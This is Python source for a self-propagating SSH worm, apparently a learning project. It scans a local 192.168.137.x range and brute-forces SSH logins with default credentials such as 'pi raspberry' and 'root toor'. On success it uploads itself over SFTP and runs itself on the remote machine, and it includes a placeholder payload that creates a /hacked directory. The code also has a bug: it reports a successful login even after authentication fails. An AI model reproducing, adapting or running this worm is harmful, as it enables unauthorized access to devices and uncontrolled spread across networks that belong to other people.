"""
Program worm should first:
1- create IP range list, 
2- try to ssh to devices within the IP range using list of user credentials
3- copy itself on ssh success
4- run the python there
5- call the harmful attack to attack the current PC it is running on
"""

import paramiko
import sys
import os

ip_range = []

user_credentials_list = [
    "root root",
    "admin admin",
    "pi raspberry",
    "root abc",
    "root toor",
    "abc abc",
    "admin password",
]

""" 
A function that creates IP addresses and adds them to the ip_range list in the range
from 192.168.137.2 - 192.168.137.254
"""
def generate_IP_list():
    for i in range(2, 255):
        ip = "192.168.137." + str(i)
        ip_range.append(ip)


"""
A function that iterates through the IP range and tries to SSH into each IP using the credentials in the user_credentials_list
"""
def start_ssh_devices():

    for ip in ip_range:
        print("Trying to ssh to Host : ", ip)

        ssh_connection = paramiko.SSHClient()

        ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        for credential in user_credentials_list:

            username_password = credential.split()
            username = username_password[0]
            password = username_password[1]

            try:
                print(
                    "Trying to ssh in with username :",
                    username,
                    " and password: ",
                    password,
                )
                ssh_connection.connect(ip, username=username, password=password)

            except paramiko.AuthenticationException:
                print("SSH to host ", ip, " failed...")

            print("SSH to host ", ip, " succeeded! I am inside hahaha!!!")

            copy_worm_excute(ssh_connection)


"""
A function that copies the worm file to the other device via ssh connection and run it there
"""
def copy_worm_excute(ssh_connx):

    worm_file = "sleepingWormy.py"

    print("Uploading file now")

    ssh_sftp = ssh_connx.open_sftp()

    ssh_sftp.put(worm_file, "/" + worm_file)

    ssh_connx.exec_command("python /" + worm_file + " 1")

    # ssh.exec_command("nohup python /" + fileName + " 1 &")

    ssh_connx.close()


"""
A function that starts doing harmful attack to the device it is running on
"""
def start_attack():
    os.mkdir("/hacked")


if __name__ == "__main__":
    generate_IP_list()
    start_ssh_devices()

    # the if statement below is to prevent the worm from harming my personal laptop, so it won't attack it but will ssh to other devices
    if len(sys.argv) > 1:
        if sys.argv[1] == "1":
            start_attack()
